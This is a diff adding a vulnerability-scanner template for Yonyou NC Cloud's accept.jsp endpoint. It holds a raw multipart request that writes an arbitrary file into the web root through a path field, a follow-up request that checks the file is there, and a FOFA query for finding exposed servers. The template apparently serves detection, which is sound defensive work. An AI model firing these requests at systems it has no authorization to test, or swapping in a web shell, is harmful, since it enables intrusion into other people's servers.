@@ -1,0 +1,46 @@
+id: accpet
+info:
+  name: 用友NC Cloud accept.jsp
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: icon_hash="1085941792"
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 293
+        Content-Type: multipart/form-data; boundary=ac1485f11aa5441defff4ab45b7fb177
+
+        --ac1485f11aa5441defff4ab45b7fb177
+        Content-Disposition: form-data; name="upload"; filename="mikes.txt"
+        Content-Type: text/plain
+
+        MichaelJordan
+        --ac1485f11aa5441defff4ab45b7fb177
+        Content-Disposition: form-data; name="fname"
+
+        \webapps\nc_web\mikes.txt
+        --ac1485f11aa5441defff4ab45b7fb177--  
+
+      - |
+        GET /mikes.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MichaelJordan"
